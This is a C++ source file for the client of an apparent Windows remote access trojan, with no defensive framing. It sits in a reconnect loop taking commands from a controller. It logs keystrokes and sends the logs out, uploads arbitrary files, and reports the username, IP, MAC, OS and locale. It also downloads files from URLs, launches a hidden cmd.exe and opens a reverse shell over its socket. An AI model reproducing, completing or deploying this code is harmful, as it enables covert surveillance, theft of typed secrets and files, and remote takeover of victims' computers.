#include "Client.h"
#include "ReverseShell.h"
#include "FileUtils.h"
#include "Sysinfo.h"

#include <Windows.h>
#include <Urlmon.h>
#include <fstream>

#pragma comment(lib, "Urlmon")

Client::Client(const char *ip, uint16_t port) : 
	m_connection(ip, port), m_keylogger("test.txt")
{ 
	Start();
}

Client::~Client()
{
}

void Client::ShowMsg(void *param)
{
	const char *msg = (const char*)param;
	const char *caption = (const char*)param + strlen(msg) + 1;
	MessageBoxA(NULL, msg, caption, NULL);
}

void Client::DownloadFile(void *param)
{
	const char *url = (const char*)param;
	const char *dst = (const char*)param + strlen(url) + 1;
	URLDownloadToFileA(NULL, url, dst, 0, NULL);
}

void Client::Execute(void *param)
{
	const char *url = (const char*)param;
	const char *dst = (const char*)param + strlen(url) + 1;
	ShellExecuteA(NULL, (char*)param, "cmd.exe", NULL, NULL, SW_HIDE);
}

void Client::Kill(void *param)
{
	m_connection.SendPacket(ByePacket("killed by command"));
	m_connection.Close();
	ExitProcess(EXIT_SUCCESS);
}

void Client::ShellSession(void *param)
{
	ReverseShell::StartShellSession(m_connection.GetSocket());
}

void Client::GetFile(void *param)
{
	const char *path = (const char*)param;
	auto bytes = File::GetAllBytes(path);
	if (!bytes.empty())
	{
		for (std::size_t i = 0; i < bytes.size(); i += 512)
			m_connection.SendPacket(DataPacket(bytes.data() + i,
				512 <= bytes.size() - i ? 512 : bytes.size() - i));
	}
}

void Client::Auth(void *param)
{
	int size = *(int*)param;
	const byte *test = (const byte*)param + 4;
	auto val = Xor(test, size, "sp1der");
	m_connection.SendPacket(AuthPacket(val.data(), val.size()));
}

void Client::Info(void *param)
{
	std::string infos =
		Sysinfo::QueryUsername()	+ ' ' +
		Sysinfo::QueryIPV4()		+ ' ' +
		Sysinfo::QueryMAC()			+ ' ' +
		Sysinfo::QueryOS()			+ ' ' +
		Sysinfo::QueryLocale();

	m_connection.SendPacket(DataPacket((const byte*)infos.c_str(), infos.size()));
}

void Client::SendLogs(void *param)
{
	auto bytes = m_keylogger.GetLogs();
	if (!bytes.empty())
	{
		for (std::size_t i = 0; i < bytes.size(); i += 512)
			m_connection.SendPacket(DataPacket(bytes.data() + i,
				512 <= bytes.size() - i ? 512 : bytes.size() - i));
	}
}

void Client::Pong(void *param)
{
	m_connection.SendPacket(PongPacket());
}

void Client::Start()
{
begin:

	while (!m_connection)
	{
		Sleep(RETRY_DELAY);
		m_connection.Retry();
	}

	while (m_connection.ReadStream() != RECV_ERROR)
	{
		auto packets = m_connection.GetPackets();
		for (_packet& p : packets)
		{
			void *param = p.data.data();

			switch (p.header.opcode)
			{
			case SHOW:		ShowMsg(param); break;
			case EXEC:		Execute(param); break;
			case DOWNLOAD:	DownloadFile(param); break;
			case SHELL:		ShellSession(param); break;
			case KILL:		Kill(param); break;
			case TEST:		Auth(param); break;
			case LOGS:		SendLogs(param); break;
			case PING:		Pong(param); break;
			}
		}
	}

	m_connection.Close();

	goto begin;
}
